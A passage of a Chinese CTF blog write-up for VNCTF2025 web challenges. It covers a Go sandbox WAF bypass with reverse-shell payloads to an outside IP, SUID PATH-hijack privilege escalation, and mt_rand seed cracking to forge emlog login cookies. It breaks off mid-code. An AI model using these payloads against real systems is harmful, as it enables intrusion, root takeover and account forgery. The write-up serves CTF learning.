class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;math/rand&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GenerateKey</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line">rand.Seed(<span class="number">2025</span>)</span><br><span class="line">randomNumber := rand.Intn(<span class="number">1000</span>)</span><br><span class="line">key := fmt.Sprintf(<span class="string">&quot;%03d%s&quot;</span>, randomNumber, <span class="string">&quot;r00t32l&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> key</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">key := GenerateKey()               <span class="comment">// 调用 GenerateKey 函数</span></span><br><span class="line">fmt.Println(<span class="string">&quot;Generated Key:&quot;</span>, key) <span class="comment">// 输出结果</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215183104538.png" class="" title="图片引用方法一"><p>拿下secret_key</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">122r00t32l</span><br></pre></td></tr></table></figure><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215183500685.png" class="" title="图片引用方法一"><p>然后我们要关注的是RCE，我们需要解决waf的问题，不允许导入os&#x2F;exec</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">containsBannedPackages</span><span class="params">(code <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">importRegex := <span class="string">`(?i)import\s*\((?s:.*?)\)`</span></span><br><span class="line">re := regexp.MustCompile(importRegex)</span><br><span class="line">matches := re.FindStringSubmatch(code)</span><br><span class="line">imports := matches[<span class="number">0</span>]</span><br><span class="line">log.Println(imports)</span><br><span class="line"><span class="keyword">if</span> strings.Contains(imports, <span class="string">&quot;os/exec&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有两个突破点啊喂！首先这个regexp只匹配了matches[0]，也就是第一个匹配到的import，那么我们后面再写一个import就行啦！也可以通过其他库来代替！</p><p>先来试试第一种吧。。直接弹shell好了</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">import</span>(</span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">cmd:=exec.Command(<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1&quot;</span>)</span><br><span class="line">out,err:=cmd.CombinedOutput()</span><br><span class="line">fmt.Println(out)</span><br><span class="line">fmt.Println(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215184451698.png" class="" title="图片引用方法一"><p>成功拿到shell！！！</p><p>以下方法也可以！</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    syscall.Exec(<span class="string">&quot;/bin/sh&quot;</span>, []<span class="type">string</span>&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;whoami&quot;</span>&#125;, []<span class="type">string</span>&#123;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/PaulXu-cn/goeval&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">cmd, _ := goeval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;cmd:=exec.Command(\&quot;bash\&quot;,\&quot;-c\&quot;,\&quot;exec bash -i &amp;&gt;/dev/tcp/ip/7777 &lt;&amp;1\&quot;);out,_:=cmd.CombinedOutput();fmt.Println(string(out))&quot;</span>,<span class="string">&quot;os/exec&quot;</span>, <span class="string">&quot;fmt&quot;</span>)</span><br><span class="line">fmt.Println(<span class="type">string</span>(cmd))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我们cat &#x2F;flag的时候读到了假的flag，那么接下来我们要做的应该就是提权了，因为flag应该在root下</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215184700593.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215184804371.png" class="" title="图片引用方法一"><p>发现了一个奇奇怪怪的东西&#x2F;…&#x2F;Cat</p><p>其他都用不太了。。</p><p>我们看看那是什么</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215184848657.png" class="" title="图片引用方法一"><p>cat不了一点，那把他下下来看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line">import (</span><br><span class="line">&quot;fmt&quot;</span><br><span class="line">)</span><br><span class="line">import(</span><br><span class="line">&quot;os/exec&quot;</span><br><span class="line">)</span><br><span class="line">func main() &#123;</span><br><span class="line">cmd:=exec.Command(&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;cp /.../Cat Cat&quot;)</span><br><span class="line">out,err:=cmd.CombinedOutput()</span><br><span class="line">fmt.Println(out)</span><br><span class="line">fmt.Println(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把该文件放到网站目录下</p><p>然后我们通过download路由把他下载下来！用ida分析一下</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215185205197.png" class="" title="图片引用方法一"><p>调用了system(“cat &#x2F;flag”);</p><p>因为该文件有suid权限，那么其实就是以root权限来执行该命令</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215185252625.png" class="" title="图片引用方法一"><p>这里当然是假的flag</p><p>我们需要看root目录下的flag文件，此处cat并不是&#x2F;bin&#x2F;cat，可以环境变量劫持。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo -e &#x27;#!/bin/bash\n/bin/bash&#x27; &gt;/tmp/cat</span><br><span class="line">chmod 777 /tmp/cat</span><br><span class="line">export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215190338915.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VNCTF&#123;910a3c76-339b-e0db-73d4-bcfb411e6b7a&#125;</span><br></pre></td></tr></table></figure><p>注意这里cat被劫持了，不能用！</p><h2 id="ez-emlog"><a href="#ez-emlog" class="headerlink" title="ez_emlog"></a>ez_emlog</h2><p>考察0day，有点逆天了。提示mt_rand，随机数生成问题。</p><p>直接全局搜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandStr</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span>, <span class="variable">$special_chars</span> = <span class="literal">true</span>, <span class="variable">$numeric_only</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$numeric_only</span>) &#123;</span><br><span class="line">        <span class="variable">$chars</span> = <span class="string">&#x27;0123456789&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$special_chars</span>) &#123;</span><br><span class="line">            <span class="variable">$chars</span> .= <span class="string">&#x27;!@#$%^&amp;*()&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$randStr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$chars_length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$randStr</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$chars</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="variable">$chars_length</span> - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randStr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查找一下用法，是在install.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$config</span> = <span class="string">&quot;&lt;?php\n&quot;</span></span><br><span class="line">    . <span class="string">&quot;//MySQL database host\n&quot;</span></span><br><span class="line">    . <span class="string">&quot;const DB_HOST = &#x27;<span class="subst">$db_host</span>&#x27;;&quot;</span></span><br><span class="line">    . <span class="string">&quot;\n//Database username\n&quot;</span></span><br><span class="line">    . <span class="string">&quot;const DB_USER = &#x27;<span class="subst">$db_user</span>&#x27;;&quot;</span></span><br><span class="line">    . <span class="string">&quot;\n//Database user password\n&quot;</span></span><br><span class="line">    . <span class="string">&quot;const DB_PASSWD = &#x27;<span class="subst">$db_pw</span>&#x27;;&quot;</span></span><br><span class="line">    . <span class="string">&quot;\n//Database name\n&quot;</span></span><br><span class="line">    . <span class="string">&quot;const DB_NAME = &#x27;<span class="subst">$db_name</span>&#x27;;&quot;</span></span><br><span class="line">    . <span class="string">&quot;\n//Database Table Prefix\n&quot;</span></span><br><span class="line">    . <span class="string">&quot;const DB_PREFIX = &#x27;<span class="subst">$db_prefix</span>&#x27;;&quot;</span></span><br><span class="line">    . <span class="string">&quot;\n//Auth key\n&quot;</span></span><br><span class="line">    . <span class="string">&quot;const AUTH_KEY = &#x27;&quot;</span> . <span class="title function_ invoke__">getRandStr</span>(<span class="number">32</span>) . <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">getUA</span>()) . <span class="string">&quot;&#x27;;&quot;</span></span><br><span class="line">    . <span class="string">&quot;\n//Cookie name\n&quot;</span></span><br><span class="line">    . <span class="string">&quot;const AUTH_COOKIE_NAME = &#x27;EM_AUTHCOOKIE_&quot;</span> . <span class="title function_ invoke__">getRandStr</span>(<span class="number">32</span>, <span class="literal">false</span>) . <span class="string">&quot;&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>AUTH_KEY和AUTH_COOKIE_NAME都用到了getRandStr，我们先看一下AUTH_KEY和AUTH_COOKIE_NAME的用法。</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216180900606.png" class="" title="图片引用方法一"><p>我们发现AUTH_COOKIE_NAME的值是可以被我们知道的。</p><p>在同一个进程中只有第一次调用mt_rand()会自动播种，接下来都会根据这个第一次播种的种子来生成随机数<br>所以说我们可以通过 AUTH_COOKIE_NAME 的值爆破种子，从而得到AUTH_KEY</p><p>也要看看AUTH_KEY的用法，发现他在loginauth.php中被使用，可能是登录的身份校验需要用到AUTH_KEY，如果我们获得了AUTH_KEY，那么我们就能通过登录校验。实现登陆的伪造！</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216181116855.png" class="" title="图片引用方法一"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">generateAuthCookie</span>(<span class="params"><span class="variable">$user_login</span>, <span class="variable">$expiration</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$key</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">emHash</span>(<span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>);</span><br><span class="line">       <span class="variable">$hash</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$hash</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">emHash</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$data</span>, AUTH_KEY);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validateAuthCookie</span>(<span class="params"><span class="variable">$cookie</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$cookie</span>)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$cookie_elements</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$cookie</span>);</span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$cookie_elements</span>) !== <span class="number">3</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">list</span>(<span class="variable">$username</span>, <span class="variable">$expiration</span>, <span class="variable">$hmac</span>) = <span class="variable">$cookie_elements</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$expiration</span>) &amp;&amp; <span class="variable">$expiration</span> &lt; <span class="title function_ invoke__">time</span>()) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$key</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">emHash</span>(<span class="variable">$username</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>);</span><br><span class="line">       <span class="variable">$hash</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$username</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$hmac</span> !== <span class="variable">$hash</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$user</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getUserDataByLogin</span>(<span class="variable">$username</span>);</span><br><span class="line">       <span class="keyword">if</span> (!<span class="variable">$user</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$user</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>上述找出了与AUTH_KEY有关的代码片段</p><p>生成认证cookie与证实认证cookie，那就石锤了。接下来我们要做的就是解决随机数问题。</p><p>先获取AUTH_COOKIE_NAME</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216181655638.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EM_AUTHCOOKIE_RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr=%20</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const AUTH_COOKIE_NAME = &#x27;EM_AUTHCOOKIE_&quot; . getRandStr(32, false) . &quot;&#x27;;</span><br></pre></td></tr></table></figure><p>因此，getRandStr(32, false)的值就是RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr</p><p>这里的false是不包含特殊字符，不用管。</p><p>然后我们就需要逆推AUTH_KEY的值了！这很简单，我的wp里有详细写过。要注意的是AUTH_KEY是先生成的，AUTH_COOKIE_NAME是后生成的，因此前面要补位32位0。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line"><span class="variable">$str_long2</span> = <span class="string">&quot;RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr&quot;</span>;</span><br><span class="line"><span class="variable">$ans</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">32</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;0 0 0 0 &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long2</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$ans</span>=<span class="title function_ invoke__">strpos</span>(<span class="variable">$str_long1</span>,<span class="variable">$str_long2</span>[<span class="variable">$i</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ans</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$ans</span>.<span class="string">&#x27; &#x27;</span>.<span class="string">&#x27;0 &#x27;</span>.(<span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>)-<span class="number">1</span>).<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 43 43 0 61 1 1 0 61 26 26 0 61 48 48 0 61 21 21 0 61 39 39 0 61 35 35 0 61 51 51 0 61 57 57 0 61 50 50 0 61 38 38 0 61 4 4 0 61 51 51 0 61 37 37 0 61 32 32 0 61 38 38 0 61 17 17 0 61 57 57 0 61 58 58 0 61 11 11 0 61 5 5 0 61 9 9 0 61 47 47 0 61 0 0 0 61 11 11 0 61 40 40 0 61 55 55 0 61 24 24 0 61 16 16 0 61 50 50 0 61 11 11 0 61 17 17 0 61 </span><br></pre></td></tr></table></figure><p>使用php_mt_seed工具爆破种子。</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216182846919.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2430606281</span><br></pre></td></tr></table></figure><p>本地运行一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandStr</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span>, <span class="variable">$special_chars</span> = <span class="literal">true</span>, <span class="variable">$numeric_only</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$numeric_only</span>) &#123;</span><br><span class="line">        <span class="variable">$chars</span> = <span class="string">&#x27;0123456789&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$special_chars</span>) &#123;</span><br><span class="line">            <span class="variable">$chars</span> .= <span class="string">&#x27;!@#$%^&amp;*()&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$randStr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$chars_length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$randStr</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$chars</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="variable">$chars_length</span> - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randStr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">2430606281</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">getRandStr</span>(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">getRandStr</span>(<span class="number">32</span>, <span class="literal">false</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yxuzKkM2QC8L8WLPFvawb(mI4R&amp;NglOA</span><br><span class="line">RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr</span><br></pre></td></tr></table></figure><p>然后算出AUTH_KEY即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const AUTH_KEY = &#x27;&quot; . getRandStr(32) . md5(getUA()) . &quot;&#x27;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UA头从题目中发布的第一篇测试文章中可以获得。</span><br><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36</span><br><span class="line"></span><br><span class="line">echo(md5(&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36&quot;));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yxuzKkM2QC8L8WLPFvawb(mI4R&amp;NglOA558fb80a37ff0f45d5abbc907683fc02</span><br></pre></td></tr></table></figure><p>拿下了AUTH_KEY。</p><p>接下来的关键点是下述三个函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 